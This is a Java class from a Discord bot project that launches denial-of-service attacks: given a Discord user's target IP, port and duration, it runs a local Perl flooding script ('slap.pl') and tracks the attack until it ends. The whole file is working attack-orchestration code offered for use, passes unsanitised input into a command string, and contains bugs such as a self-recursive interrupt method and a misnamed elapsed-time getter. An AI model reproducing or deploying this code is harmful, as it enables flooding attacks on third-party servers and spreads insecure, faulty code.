package de.kitt3120.viperbot.objects;

import de.kitt3120.viperbot.Core;
import net.dv8tion.jda.core.entities.User;

import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Created by kitt3120 on 22.04.2017.
 */
public class DDoSAttack implements Runnable {

    private User user;
    private String ip;
    private int port, seconds;
    private Runnable onFinish, onInterrupt;
    private Process process;
    private ScheduledExecutorService scheduler;
    private Date startTime;

    public DDoSAttack(User user, String ip, int port, int seconds, Runnable onFinish, Runnable onInterrupt) {
        this.user = user;
        this.ip = ip;
        this.port = port;
        this.seconds = seconds;
        this.onFinish = onFinish;
        this.onInterrupt = onInterrupt;
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
        this.startTime = Calendar.getInstance().getTime();

        Thread thread = new Thread(this);
        thread.start();
    }

    @Override
    public void run() {
        try {
            process = Runtime.getRuntime().exec("perl /root/Tools/DDoS/slap.pl " + ip + " " + port + " 1000 " + seconds);
            scheduler.schedule(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, seconds, TimeUnit.SECONDS);
        } catch (IOException e) {
            e.printStackTrace();
            interrupt();
        }
    }

    public void interrupt() {
        if (process != null && process.isAlive()) {
            process.destroy();
        }
        Core.ddosManager.removeAttack(user);
        new Thread(onInterrupt).start();
        this.interrupt();
    }

    private void finish() {
        process.destroy();
        Core.ddosManager.removeAttack(user);
        new Thread(onFinish).start();
    }

    public long getSecondsRemaining() {
        Date now = Calendar.getInstance().getTime();
        long seconds = (now.getTime() - startTime.getTime()) / 1000;
        return seconds;
    }

    public User getUser() {
        return user;
    }

    public void setUser(User user) {
        this.user = user;
    }

    public String getIp() {
        return ip;
    }

    public void setIp(String ip) {
        this.ip = ip;
    }

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public int getSeconds() {
        return seconds;
    }

    public void setSeconds(int seconds) {
        this.seconds = seconds;
    }

    public Process getProcess() {
        return process;
    }

    public void setProcess(Process process) {
        this.process = process;
    }

    public Date getStartTime() {
        return startTime;
    }

    public void setStartTime(Date startTime) {
        this.startTime = startTime;
    }
}
